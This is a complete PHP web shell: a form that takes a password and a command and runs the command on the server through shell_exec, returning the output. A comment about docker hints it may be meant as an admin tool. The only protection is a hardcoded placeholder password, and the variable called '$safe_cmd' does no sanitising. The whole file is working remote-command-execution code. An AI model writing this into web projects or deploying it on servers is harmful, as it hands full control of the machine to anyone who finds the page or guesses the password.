<?php
// Simple auth — change this password
$secret = 'change_this_password';

// require POST + secret to run
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'], $_POST['pwd']) && $_POST['pwd'] === $secret) {
    $cmd = trim($_POST['cmd']);
    if ($cmd === '') {
        $output = "No command provided.";
    } else {
        // If you know the full path, prefer it, e.g. /usr/bin/docker
        // Append 2>&1 to capture stderr
        $safe_cmd = $cmd . ' 2>&1';
        // Check function availability
        if (!function_exists('shell_exec')) {
            $output = "shell_exec is not available on this PHP installation.";
        } else {
            $out = shell_exec($safe_cmd);
            if ($out === null) $out = "(no output - command may have failed or been blocked)";
            $output = $out;
        }
    }
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>

<form method="post">
    <input type="password" name="pwd" placeholder="password" required>
    <input type="text" name="cmd" placeholder="Enter command (use full path if needed)" style="width:80%" required>
    <input type="submit" value="Run">
</form>
